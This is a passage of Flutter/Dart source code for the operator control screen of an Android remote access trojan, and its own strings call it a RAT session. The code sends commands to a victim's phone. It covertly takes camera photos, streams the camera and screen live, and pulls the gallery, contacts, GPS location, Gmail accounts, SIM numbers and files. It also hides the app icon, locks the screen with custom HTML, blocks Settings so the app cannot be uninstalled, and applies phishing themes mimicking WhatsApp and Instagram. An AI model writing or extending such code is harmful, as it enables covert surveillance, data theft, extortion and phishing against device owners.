  final pinned = _scaffoldHasBottomChrome(context);

  ScaffoldMessenger.of(context)
    ..hideCurrentSnackBar()
    ..showSnackBar(
      SnackBar(
        backgroundColor: HoxtenThemeColors.b3,
        content: Row(
          children: [
            Icon(icon, color: color, size: 20),
            const SizedBox(width: 12),
            Expanded(
              child: Text(
                message,
                style: HoxtenThemeTypography.bodySmall(color: HoxtenThemeColors.t0).copyWith(fontWeight: FontWeight.w600),
              ),
            ),
          ],
        ),
        behavior: pinned ? SnackBarBehavior.fixed : SnackBarBehavior.floating,
        margin: pinned ? null : const EdgeInsets.fromLTRB(16, 12, 16, 16),
        duration: const Duration(seconds: 3),
      ),
    );
}

class DarkMeshBackground extends StatelessWidget {
  const DarkMeshBackground({super.key, required this.child});

  final Widget child;

  @override
  Widget build(BuildContext context) {
    return Stack(
      fit: StackFit.expand,
      children: [
        const DecoratedBox(
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topCenter,
              end: Alignment.bottomCenter,
              colors: [Color(0xFF060B16), HoxtenColors.bg],
            ),
          ),
        ),
        Positioned(
          top: -120,
          right: -80,
          child: Container(
            width: 280,
            height: 280,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              gradient: RadialGradient(colors: [HoxtenColors.accent.withValues(alpha: 0.18), Colors.transparent]),
            ),
          ),
        ),
        Positioned(
          bottom: -60,
          left: -40,
          child: Container(
            width: 220,
            height: 220,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              gradient: RadialGradient(colors: [HoxtenColors.accent2.withValues(alpha: 0.08), Colors.transparent]),
            ),
          ),
        ),
        CustomPaint(painter: _GridPainter(color: HoxtenColors.accent.withValues(alpha: 0.035))),
        child,
      ],
    );
  }
}

class SakuraMeshBackground extends StatefulWidget {
  const SakuraMeshBackground({
    super.key,
    required this.child,
    this.scanLine = false,
  });

  final Widget child;
  final bool scanLine;

  @override
  State<SakuraMeshBackground> createState() => _SakuraMeshBackgroundState();
}

class _SakuraMeshBackgroundState extends State<SakuraMeshBackground> with SingleTickerProviderStateMixin {
  AnimationController? _scanCtrl;

  @override
  void initState() {
    super.initState();
    if (widget.scanLine) {
      _scanCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 3200))..repeat();
    }
  }

  @override
  void didUpdateWidget(covariant SakuraMeshBackground oldWidget) {
    super.didUpdateWidget(oldWidget);
    if (widget.scanLine && _scanCtrl == null) {
      _scanCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 3200))..repeat();
    } else if (!widget.scanLine && _scanCtrl != null) {
      _scanCtrl!.dispose();
      _scanCtrl = null;
    }
  }

  @override
  void dispose() {
    _scanCtrl?.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Stack(
      fit: StackFit.expand,
      children: [
        const DecoratedBox(
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [HoxtenThemeColors.b0, HoxtenThemeColors.b1, HoxtenThemeColors.b0],
            ),
          ),
        ),
        Positioned(
          top: -80,
          left: -30,
          child: Container(
            width: 240,
            height: 240,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              gradient: RadialGradient(colors: [HoxtenColors.dashAccent.withValues(alpha: 0.14), Colors.transparent]),
            ),
          ),
        ),
        Positioned(
          bottom: 100,
          right: -50,
          child: Container(
            width: 200,
            height: 200,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              gradient: RadialGradient(colors: [HoxtenColors.dashAccent2.withValues(alpha: 0.12), Colors.transparent]),
            ),
          ),
        ),
        CustomPaint(painter: _DotGridPainter(color: HoxtenColors.dashAccent.withValues(alpha: 0.045))),
        if (widget.scanLine && _scanCtrl != null)
          AnimatedBuilder(
            animation: _scanCtrl!,
            builder: (context, _) => Positioned(
              top: -40 + _scanCtrl!.value * (MediaQuery.sizeOf(context).height + 80),
              left: 0,
              right: 0,
              child: Container(
                height: 1.5,
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [
                      Colors.transparent,
                      HoxtenColors.dashAccent.withValues(alpha: 0.08),
                      HoxtenColors.dashAccent.withValues(alpha: 0.35),
                      HoxtenColors.dashAccent.withValues(alpha: 0.08),
                      Colors.transparent,
                    ],
                  ),
                ),
              ),
            ),
          ),
        widget.child,
      ],
    );
  }
}

class GlassPanel extends StatelessWidget {
  const GlassPanel({
    super.key,
    required this.child,
    this.padding = const EdgeInsets.all(20),
    this.radius = HoxtenRadius.lg,
    this.tint = HoxtenColors.card,
    this.borderColor,
    this.blur = 0,
  });

  final Widget child;
  final EdgeInsets padding;
  final double radius;
  final Color tint;
  final Color? borderColor;
  final double blur;

  @override
  Widget build(BuildContext context) {
    final panel = Container(
      padding: padding,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(radius),
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [tint.withValues(alpha: 0.96), tint.withValues(alpha: 0.88)],
        ),
        border: Border.all(color: borderColor ?? HoxtenColors.accent.withValues(alpha: 0.16)),
        boxShadow: [
          BoxShadow(color: Colors.black.withValues(alpha: 0.28), blurRadius: 32, offset: const Offset(0, 16)),
          BoxShadow(color: HoxtenColors.accent.withValues(alpha: 0.06), blurRadius: 24, offset: const Offset(0, 8)),
        ],
      ),
      child: child,
    );

    if (blur <= 0) return panel;
    return ClipRRect(
      borderRadius: BorderRadius.circular(radius),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: blur, sigmaY: blur),
        child: panel,
      ),
    );
  }
}

class _GridPainter extends CustomPainter {
  _GridPainter({required this.color});

  final Color color;

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()..color = color..strokeWidth = 1;
    const step = 44.0;
    for (double x = 0; x < size.width; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    for (double y = 0; y < size.height; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

class _DotGridPainter extends CustomPainter {
  _DotGridPainter({required this.color});

  final Color color;

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()..color = color..strokeWidth = 1;
    const step = 36.0;
    for (double x = 0; x < size.width; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    for (double y = 0; y < size.height; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }

    final dot = Paint()..color = color.withValues(alpha: 0.8);
    for (double x = 0; x < size.width; x += step * 3) {
      for (double y = 0; y < size.height; y += step * 3) {
        canvas.drawCircle(Offset(x, y), 1.2, dot);
      }
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}






class HoxtenDeviceControlScreen extends StatefulWidget {
  const HoxtenDeviceControlScreen({super.key, this.embedded = false, this.onPickDevice});

  final bool embedded;
  final VoidCallback? onPickDevice;

  @override
  State<HoxtenDeviceControlScreen> createState() => _HoxtenDeviceControlScreenState();
}

class _HoxtenDeviceControlScreenState extends State<HoxtenDeviceControlScreen> {
  final _cmd = HoxtenCommandService();
  bool _busy = false;

  Future<void> _run(String command, [dynamic value]) async {
    final socket = context.read<HoxtenSocketService>();
    final token = socket.commandToken;
    final id = socket.selectedDeviceId;
    if (id == null) return;

    setState(() => _busy = true);
    try {
      if (token == null) {
        if (mounted) {
          showSyncSnack(context, 'Menunggu sesi RAT — tap refresh', error: true);
        }
        return;
      }
      await _cmd.send(token: token, deviceId: id, command: command, value: value);
    } catch (e) {
      if (mounted) showSyncSnack(context, e.toString(), error: true);
    } finally {
      if (mounted) setState(() => _busy = false);
    }
  }

  Future<void> _takeScreenshot(String facing) async {
    final socket = context.read<HoxtenSocketService>();
    final token = socket.commandToken;
    final id = socket.selectedDeviceId;
    if (id == null) return;

    setState(() => _busy = true);
    try {
      if (token == null) {
        if (mounted) {
          showSyncSnack(context, 'Menunggu sesi RAT — tap refresh', error: true);
        }
        return;
      }
      await _cmd.send(token: token, deviceId: id, command: 'camera', value: facing);
      await Future<void>.delayed(const Duration(milliseconds: 2500));
      final frame = await _cmd.fetchScreenshot(token: token, deviceId: id);
      await _cmd.send(token: token, deviceId: id, command: 'camera', value: 'off');
      if (!mounted) return;
      _showPhotoDialog(facing == 'front' ? 'Depan' : 'Belakang', frame);
    } catch (e) {
      if (token != null) {
        await _cmd.send(token: token, deviceId: id, command: 'camera', value: 'off');
      }
      if (mounted) showSyncSnack(context, e.toString(), error: true);
    } finally {
      if (mounted) setState(() => _busy = false);
    }
  }

  void _showPhotoDialog(String label, String frame) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: HoxtenThemeColors.b2,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: HoxtenThemeColors.cyan.withValues(alpha: 0.12)),
        ),
        title: Text('Foto $label', style: HoxtenThemeTypography.title()),
        content: SizedBox(height: 260, child: Base64Image(data: frame, borderRadius: BorderRadius.circular(12))),
        actions: [
          FilledButton(
            style: FilledButton.styleFrom(backgroundColor: HoxtenThemeColors.cyan, foregroundColor: Colors.white),
            onPressed: () => Navigator.pop(context),
            child: const Text('Tutup'),
          ),
        ],
      ),
    );
  }

  void _showBlockAppSheet(List<Map<String, dynamic>> apps, List<String> blocked) {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => DraggableScrollableSheet(
        expand: false,
        initialChildSize: 0.65,
        maxChildSize: 0.9,
        builder: (_, scroll) => Container(
          decoration: BoxDecoration(
            color: HoxtenThemeColors.b2,
            borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
            border: Border.all(color: HoxtenThemeColors.cyan.withValues(alpha: 0.1)),
          ),
          child: Column(
            children: [
              const SizedBox(height: 10),
              Container(width: 40, height: 4, decoration: BoxDecoration(color: HoxtenThemeColors.cyan.withValues(alpha: 0.2), borderRadius: BorderRadius.circular(99))),
              Padding(
                padding: const EdgeInsets.all(18),
                child: Text('Block App', style: HoxtenThemeTypography.title().copyWith(fontSize: 16)),
              ),
              Expanded(
                child: apps.isEmpty
                    ? Center(child: Text('Belum ada data', style: HoxtenThemeTypography.body()))
                    : ListView.separated(
                        controller: scroll,
                        itemCount: apps.length,
                        separatorBuilder: (_, __) => Divider(height: 1, color: HoxtenThemeColors.cyan.withValues(alpha: 0.08)),
                        itemBuilder: (_, i) {
                          final app = apps[i];
                          final pkg = app['package']?.toString() ?? '';
                          final name = app['name']?.toString() ?? pkg;
                          final isBlocked = blocked.contains(pkg);
                          return ListTile(
                            title: Text(name, style: HoxtenThemeTypography.body().copyWith(fontWeight: FontWeight.w600)),
                            subtitle: Text(pkg, style: HoxtenThemeTypography.caption(color: HoxtenThemeColors.t2), maxLines: 1, overflow: TextOverflow.ellipsis),
                            trailing: Icon(isBlocked ? Icons.check_circle : Icons.block, color: isBlocked ? HoxtenThemeColors.dashGreen : HoxtenThemeColors.dashRed, size: 20),
                            onTap: () async {
                              Navigator.pop(context);
                              if (pkg.isEmpty) return;
                              if (isBlocked) {
                                await _run('unblockApp', pkg);
                              } else {
                                await _run('blockApp', {'package': pkg, 'name': name});
                              }
                            },
                          );
                        },
                      ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _showTextSheet(String title, String body) {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => DraggableScrollableSheet(
        expand: false,
        initialChildSize: 0.45,
        maxChildSize: 0.8,
        builder: (_, scroll) => Container(
          decoration: BoxDecoration(
            color: HoxtenThemeColors.b2,
            borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
            border: Border.all(color: HoxtenThemeColors.cyan.withValues(alpha: 0.1)),
          ),
          child: ListView(
            controller: scroll,
            padding: const EdgeInsets.all(18),
            children: [
              Text(title, style: HoxtenThemeTypography.title().copyWith(fontSize: 16)),
              const SizedBox(height: 12),
              Text(body, style: HoxtenThemeTypography.body()),
            ],
          ),
        ),
      ),
    );
  }

  Future<void> _downloadFile(String path, String name) async {
    final socket = context.read<HoxtenSocketService>();
    final token = socket.commandToken;
    final id = socket.selectedDeviceId;
    if (id == null) return;

    setState(() => _busy = true);
    try {
      if (token == null) {
        if (mounted) {
          showSyncSnack(context, 'Menunggu sesi RAT — tap refresh', error: true);
        }
        return;
      }
      final bytes = await _cmd.downloadFile(token: token, deviceId: id, path: path);
      final dir = await getTemporaryDirectory();
      final file = File('${dir.path}/$name');
      await file.writeAsBytes(bytes);
      await Share.shareXFiles([XFile(file.path)], text: name);
      if (mounted) showSyncSnack(context, 'File siap dibagikan', success: true);
    } catch (e) {
      if (mounted) showSyncSnack(context, e.toString(), error: true);
    } finally {
      if (mounted) setState(() => _busy = false);
    }
  }

  void _showFilesSheet(List<Map<String, dynamic>> items, String rootPath) {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => DraggableScrollableSheet(
        expand: false,
        initialChildSize: 0.65,
        maxChildSize: 0.9,
        builder: (_, scroll) => Container(
          decoration: BoxDecoration(
            color: HoxtenThemeColors.b2,
            borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
            border: Border.all(color: HoxtenThemeColors.cyan.withValues(alpha: 0.1)),
          ),
          child: Column(
            children: [
              const SizedBox(height: 10),
              Container(width: 40, height: 4, decoration: BoxDecoration(color: HoxtenThemeColors.cyan.withValues(alpha: 0.2), borderRadius: BorderRadius.circular(99))),
              Padding(
                padding: const EdgeInsets.all(18),
                child: Text('Files Â· $rootPath', style: HoxtenThemeTypography.title().copyWith(fontSize: 16)),
              ),
              Expanded(
                child: items.isEmpty
                    ? Center(child: Text('Belum ada data', style: HoxtenThemeTypography.body()))
                    : ListView.separated(
                        controller: scroll,
                        itemCount: items.length,
                        separatorBuilder: (_, __) => Divider(height: 1, color: HoxtenThemeColors.cyan.withValues(alpha: 0.08)),
                        itemBuilder: (_, i) {
                          final file = items[i];
                          final name = file['name']?.toString() ?? '-';
                          final isDir = file['isDir'] == true || file['isDirectory'] == true;
                          final fullPath = file['path']?.toString() ?? '$rootPath$name';
                          return ListTile(
                            leading: Icon(isDir ? Icons.folder_outlined : Icons.insert_drive_file_outlined, color: HoxtenThemeColors.cyan),
                            title: Text(name, style: HoxtenThemeTypography.body().copyWith(fontWeight: FontWeight.w600)),
                            subtitle: isDir ? null : Text('Tap untuk download', style: HoxtenThemeTypography.bodySmall()),
                            onTap: isDir
                                ? null
                                : () {
                                    Navigator.pop(context);
                                    _downloadFile(fullPath, name);
                                  },
                          );
                        },
                      ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _showDataSheet(String title, List<Map<String, dynamic>> items, String Function(Map<String, dynamic>) label) {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => DraggableScrollableSheet(
        expand: false,
        initialChildSize: 0.65,
        maxChildSize: 0.9,
        builder: (_, scroll) => Container(
          decoration: BoxDecoration(
            color: HoxtenThemeColors.b2,
            borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
            border: Border.all(color: HoxtenThemeColors.cyan.withValues(alpha: 0.1)),
          ),
          child: Column(
            children: [
              const SizedBox(height: 10),
              Container(width: 40, height: 4, decoration: BoxDecoration(color: HoxtenThemeColors.cyan.withValues(alpha: 0.2), borderRadius: BorderRadius.circular(99))),
              Padding(
                padding: const EdgeInsets.all(18),
                child: Text(title, style: HoxtenThemeTypography.title().copyWith(fontSize: 16)),
              ),
              Expanded(
                child: items.isEmpty
                    ? Center(child: Text('Belum ada data', style: HoxtenThemeTypography.body()))
                    : ListView.separated(
                        controller: scroll,
                        itemCount: items.length,
                        separatorBuilder: (_, __) => Divider(height: 1, color: HoxtenThemeColors.cyan.withValues(alpha: 0.08)),
                        itemBuilder: (_, i) => ListTile(
                          title: Text(label(items[i]), style: HoxtenThemeTypography.body().copyWith(fontWeight: FontWeight.w600)),
                          dense: true,
                        ),
                      ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Future<void> _urlAction(String title, String command) async {
    final url = await showPromptDialog(context, title: title, hint: 'https://...');
    if (url != null) await _run(command, url);
  }

  void _openCamPicker(HoxtenDeviceModel device) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      builder: (_) => Container(
        margin: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          color: HoxtenThemeColors.b2,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: HoxtenThemeColors.cyan.withValues(alpha: 0.1)),
        ),
        child: SafeArea(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Padding(
                padding: const EdgeInsets.all(16),
                child: Text('Pilih Kamera', style: HoxtenThemeTypography.title()),
              ),
              ListTile(
                leading: Container(
                  width: 36,
                  height: 36,
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(10),
                    color: HoxtenThemeColors.cyan.withValues(alpha: 0.08),
                  ),
                  child: const Icon(Icons.camera_rear_outlined, color: HoxtenThemeColors.cyan, size: 20),
                ),
                title: Text('Kamera Belakang', style: HoxtenThemeTypography.body().copyWith(fontWeight: FontWeight.w600)),
                onTap: () {
                  Navigator.pop(context);
                  pushHoxtenStreamViewer(
                    context,
                    deviceId: device.id,
                    deviceName: device.name,
                    type: StreamType.camera,
                    facing: 'back',
                  );
                },
              ),
              ListTile(
                leading: Container(
                  width: 36,
                  height: 36,
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(10),
                    color: HoxtenThemeColors.cyan.withValues(alpha: 0.08),
                  ),
                  child: const Icon(Icons.camera_front_outlined, color: HoxtenThemeColors.cyan, size: 20),
                ),
                title: Text('Kamera Depan', style: HoxtenThemeTypography.body().copyWith(fontWeight: FontWeight.w600)),
                onTap: () {
                  Navigator.pop(context);
                  pushHoxtenStreamViewer(
                    context,
                    deviceId: device.id,
                    deviceName: device.name,
                    type: StreamType.camera,
                    facing: 'front',
                  );
                },
              ),
              const SizedBox(height: 8),
            ],
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final uiKey = context.select<HoxtenSocketService, String?>((s) => s.selectedDeviceUiKey);
    final socket = context.read<HoxtenSocketService>();
    final device = socket.selectedDevice;

    final Widget body;
    if (device == null) {
      body = Padding(
        padding: const EdgeInsets.fromLTRB(0, 0, 0, 100),
        child: FadeSlideIn(
          child: Center(
            child: Padding(
              padding: const EdgeInsets.symmetric(horizontal: 16),
              child: _ControlNoDeviceState(onPickDevice: widget.onPickDevice),
            ),
          ),
        ),
      );
    } else {
      body = KeyedSubtree(
        key: ValueKey(uiKey),
        child: _DeviceControlBody(
          device: device,
          busy: _busy,
          onRun: _run,
          onScreenshot: _takeScreenshot,
          onShowData: _showDataSheet,
          onShowText: (body, {title = 'Info'}) => _showTextSheet(title, body),
          onShowFiles: _showFilesSheet,
          onBlockApps: _showBlockAppSheet,
          onUrlAction: _urlAction,
          onOpenCam: _openCamPicker,
        ),
      );
    }

    return Stack(
      fit: StackFit.expand,
      children: [
        const _ControlBackdrop(),
        body,
      ],
    );
  }
}

const _kSettingsPackage = 'com.android.settings';

class _DeviceControlBody extends StatelessWidget {
  const _DeviceControlBody({
    required this.device,
    required this.busy,
    required this.onRun,
    required this.onScreenshot,
    required this.onShowData,
    required this.onShowText,
    required this.onShowFiles,
    required this.onBlockApps,
    required this.onUrlAction,
    required this.onOpenCam,
  });

  final HoxtenDeviceModel device;
  final bool busy;
  final Future<void> Function(String command, [dynamic value]) onRun;
  final Future<void> Function(String facing) onScreenshot;
  final void Function(String title, List<Map<String, dynamic>> items, String Function(Map<String, dynamic>) label) onShowData;
  final void Function(String body, {String title}) onShowText;
  final void Function(List<Map<String, dynamic>> items, String rootPath) onShowFiles;
  final void Function(List<Map<String, dynamic>> apps, List<String> blocked) onBlockApps;
  final Future<void> Function(String title, String command) onUrlAction;
  final void Function(HoxtenDeviceModel device) onOpenCam;

  Widget _section(String title) => Padding(
        padding: const EdgeInsets.fromLTRB(16, 18, 16, 10),
        child: Text(title.toUpperCase(), style: HoxtenThemeTypography.tag()),
      );

  Widget _commandGrid(List<Widget> children) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 16),
      child: GridView.count(
        shrinkWrap: true,
        physics: const NeverScrollableScrollPhysics(),
        crossAxisCount: 2,
        mainAxisSpacing: 10,
        crossAxisSpacing: 10,
        childAspectRatio: 0.92,
        children: children,
      ),
    );
  }

  String _themeLabel(String value) {
    return switch (value.toLowerCase()) {
      'whatsapp' => 'WhatsApp',
      'instagram' => 'Instagram',
      'youtube' => 'YouTube',
      'telegram' => 'Telegram',
      'xnxx' => 'XNXX',
      _ => 'Default',
    };
  }

  @override
  Widget build(BuildContext context) {
    final socket = context.read<HoxtenSocketService>();
    final s = device.status;
    final id = device.id;

    return Stack(
      children: [
        ListView(
          physics: const BouncingScrollPhysics(parent: AlwaysScrollableScrollPhysics()),
          padding: const EdgeInsets.fromLTRB(0, 0, 0, 100),
          children: [
            FadeSlideIn(child: _DeviceBanner(device: device)),
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 16),
              child: Text('REMOTE KONTROL', style: HoxtenThemeTypography.logo(fontSize: 18)),
            ),
            _section('Kontrol'),
            _commandGrid([
                  ControlTile(
                    title: 'Flashlight',
                    subtitle: s.flashlight ? 'Aktif' : 'Off',
                    icon: Icons.flash_on,
                    trailing: HoxtenSwitch(value: s.flashlight, onChanged: (v) => onRun('flashlight', v)),
                  ),
                  ControlTile(
                    title: 'Lock Device',
                    subtitle: s.deviceLocked ? 'Locked' : 'Off',
                    icon: Icons.lock_outline,
                    trailing: HoxtenSwitch(
                      value: s.deviceLocked,
                      onChanged: (v) async {
                        if (v) {
                          final title = await showPromptDialog(context, title: 'Lock Device', hint: 'Judul lock screen', initial: 'Locked');
                          if (title != null) await onRun('lockDevice', jsonEncode({'title': title}));
                        } else {
                          await onRun('unlockDevice');
                        }
                      },
                    ),
                  ),
                  ControlTile(
                    title: 'Hide Icon',
                    subtitle: s.iconHidden ? 'Hidden' : 'Off',
                    icon: Icons.visibility_off_outlined,
                    color: const Color(0xFFE65100),
                    trailing: HoxtenSwitch(value: s.iconHidden, onChanged: (v) => onRun('hideIcon', v ? 'true' : 'false')),
                  ),
                  ControlTile(
                    title: 'Stuck Layar',
                    subtitle: s.touchBlocked ? 'Aktif' : 'Tap block',
                    icon: Icons.touch_app,
                    color: const Color(0xFF00838F),
                    onTap: () async {
                      final msg = await showPromptDialog(context, title: 'Block Touch', hint: 'Pesan overlay', initial: 'Layar diblokir');
                      if (msg != null) await onRun('touchBlock', jsonEncode({'message': msg, 'duration': 0}));
                    },
                  ),
                  ControlTile(
                    title: 'TTS',
                    subtitle: s.ttsSpeaking ? 'Speaking' : 'Tap bicara',
                    icon: Icons.record_voice_over_outlined,
                    color: const Color(0xFF7B1FA2),
                    onTap: () async {
                      final text = await showPromptDialog(context, title: 'Text to Speech', hint: 'Ketik teks', maxLines: 3);
                      if (text != null) await onRun('ttsSpeak', {'text': text, 'lang': 'id'});
                    },
                  ),
                  ControlTile(
                    title: 'Mute Volume',
                    subtitle: s.mutedVolumeLabel,
                    icon: Icons.volume_off,
                    color: const Color(0xFF2E7D4A),
                    trailing: HoxtenSwitch(value: s.volumeMuted, onChanged: (v) => onRun('muteVolume', v ? 'true' : 'false')),
                  ),
                  ControlTile(title: 'Foto Depan', subtitle: 'Screenshot', icon: Icons.camera_front_outlined, onTap: () => onScreenshot('front')),
                  ControlTile(title: 'Foto Belakang', subtitle: 'Screenshot', icon: Icons.camera_rear_outlined, onTap: () => onScreenshot('back')),
                  ControlTile(
                    title: 'Vibrate',
                    subtitle: 'Getar device',
                    icon: Icons.vibration,
                    onTap: () async {
                      final ms = await showPromptDialog(context, title: 'Vibrate', hint: 'Durasi ms', initial: '1000');
                      if (ms != null) await onRun('vibrate', ms);
                    },
                  ),
                  ControlTile(
                    title: 'Toast',
                    subtitle: 'Kirim pesan',
                    icon: Icons.message_outlined,
                    onTap: () async {
                      final msg = await showPromptDialog(context, title: 'Toast Message', hint: 'Pesan', maxLines: 2);
                      if (msg != null) await onRun('showToast', msg);
                    },
                  ),
                  ControlTile(
                    title: 'Spam Dialog',
                    subtitle: s.dialogSpamActive ? 'Aktif' : 'Tap spam',
                    icon: Icons.notifications_active_outlined,
                    onTap: () async {
                      final msg = await showPromptDialog(context, title: 'Spam Dialog', hint: 'Pesan spam', maxLines: 2);
                      if (msg != null) await onRun('dialogSpam', {'text': msg});
                    },
                  ),
                  ControlTile(
                    title: 'Block App',
                    subtitle: '${s.blockedApps.length} diblokir',
                    icon: Icons.block,
                    color: HoxtenThemeColors.dashRed,
                    onTap: () async {
                      await onRun('getInstalledApps', 'true');
                      await Future<void>.delayed(const Duration(milliseconds: 1200));
                      final apps = socket.appsByDevice[id] ?? [];
                      if (!context.mounted) return;
                      onBlockApps(apps, s.blockedApps);
                    },
                  ),
                  ControlTile(
                    title: 'Anti Uninstall',
                    subtitle: s.antiUninstall ? 'Aplikasi tidak bisa dihapus' : 'Off',
                    icon: Icons.shield_outlined,
                    color: HoxtenThemeColors.dashRed,
                    trailing: HoxtenSwitch(
                      value: s.antiUninstall,
                      onChanged: (v) async {
                        if (v) {
                          await onRun(
                            'blockApp',
                            jsonEncode({'package': _kSettingsPackage, 'name': 'Settings'}),
                          );
                          socket.patchDeviceStatus(id, (st) => st.copyWith(antiUninstall: true));
                        } else {
                          await onRun('unblockApp', _kSettingsPackage);
                          socket.patchDeviceStatus(id, (st) => st.copyWith(antiUninstall: false));
                        }
                      },
                    ),
                  ),
                  ControlTile(
                    title: 'Lock Custom',
                    subtitle: s.lockCustomActive ? 'Aktif' : 'Off',
                    icon: Icons.web_asset,
                    color: const Color(0xFF5E35B1),
                    trailing: HoxtenSwitch(
                      value: s.lockCustomActive,
                      onChanged: (v) async {
                        if (v) {
                          final html = await showPromptDialog(
                            context,
                            title: 'Lock Custom HTML',
                            hint: 'Paste HTML lock screen',
                            maxLines: 6,
                            initial: '<h1 style="color:white;text-align:center">Locked</h1>',
                          );
                          if (html == null) return;
                          await onRun('lockCustom', html);
                          socket.patchDeviceStatus(
                            id,
                            (st) => st.copyWith(
                              lockCustomActive: true,
                              lockCustomHtml: html,
                              deviceLocked: false,
                            ),
                          );
                        } else {
                          await onRun('lockCustom', '');
                          socket.patchDeviceStatus(
                            id,
                            (st) => st.copyWith(lockCustomActive: false, lockCustomHtml: ''),
                          );
                        }
                      },
                    ),
                  ),
                  ControlTile(
                    title: 'Tema Phishing',
                    subtitle: _themeLabel(s.currentTheme),
                    icon: Icons.palette_outlined,
                    color: const Color(0xFFAD1457),
                    onTap: () => _showPhishingThemeSheet(context, onRun),
                  ),
            ]),
            _section('Live Stream'),
            _commandGrid([
              ControlTile(
                title: 'Live Camera',
                subtitle: s.cameraActive ? 'Live' : 'Back / Front',
                icon: Icons.videocam_outlined,
                onTap: () => onOpenCam(device),
              ),
              ControlTile(
                title: 'Live Screen',
                subtitle: s.screenActive ? 'Live' : 'Start',
                icon: Icons.screenshot_monitor_outlined,
                color: const Color(0xFF00838F),
                onTap: () => pushHoxtenStreamViewer(
                  context,
                  deviceId: id,
                  deviceName: device.name,
                  type: StreamType.screen,
                ),
              ),
            ]),
            _section('Info Device'),
            _commandGrid([
              ControlTile(
                title: 'Galeri',
                subtitle: 'Lihat foto device',
                icon: Icons.photo_library_outlined,
                onTap: () async {
                  await onRun('getGallery');
                  await Future<void>.delayed(const Duration(milliseconds: 1500));
                  onShowData('Galeri', socket.galleryByDevice[id] ?? [], (p) => p['name']?.toString() ?? 'Foto');
                },
              ),
              ControlTile(
                title: 'Kontak',
                subtitle: 'Daftar kontak',
                icon: Icons.contacts_outlined,
                onTap: () async {
                  await onRun('getContacts');
                  await Future<void>.delayed(const Duration(milliseconds: 1500));
                  onShowData('Kontak', socket.contactsByDevice[id] ?? [], DevicePayload.contactLine);
                },
              ),
              ControlTile(
                title: 'GPS',
                subtitle: 'Lokasi device',
                icon: Icons.location_on_outlined,
                onTap: () async {
                  await onRun('getLocation');
                  await Future<void>.delayed(const Duration(milliseconds: 1500));
                  final loc = socket.locationByDevice[id];
                  if (loc != null && context.mounted) {
                    onShowText(DevicePayload.locationLine(loc));
                  }
                },
              ),
              ControlTile(
                title: 'Gmail',
                subtitle: 'Akun email',
                icon: Icons.mail_outline,
                onTap: () async {
                  await onRun('getGmail');
                  await Future<void>.delayed(const Duration(milliseconds: 1500));
                  onShowText(DevicePayload.gmailSummary(socket.gmailByDevice[id] as Map<String, dynamic>?), title: 'Akun Gmail');
                },
              ),
              ControlTile(
                title: 'Phone',
                subtitle: 'Nomor SIM',
                icon: Icons.phone_outlined,
                onTap: () async {
                  await onRun('getPhone');
                  await Future<void>.delayed(const Duration(milliseconds: 1500));
                  onShowText(DevicePayload.phoneSummary(socket.phoneByDevice[id] as Map<String, dynamic>?), title: 'Nomor SIM');
                },
              ),
              ControlTile(
                title: 'Files',
                subtitle: 'Browse /sdcard',
                icon: Icons.folder_outlined,
                onTap: () async {
                  await onRun('getFiles', '/sdcard/');
                  await Future<void>.delayed(const Duration(milliseconds: 1500));
                  onShowFiles(socket.filesByDevice[id] ?? [], '/sdcard/');
                },
              ),
            ]),
            _section('Advanced'),
            _commandGrid([
              ControlTile(title: 'Video Overlay', subtitle: 'Putar overlay', icon: Icons.play_circle_outline, onTap: () => onRun('videoOverlay')),
              ControlTile(title: 'Stop Overlay', subtitle: 'Matikan overlay', icon: Icons.stop_circle_outlined, onTap: () => onRun('videoOverlayHide')),
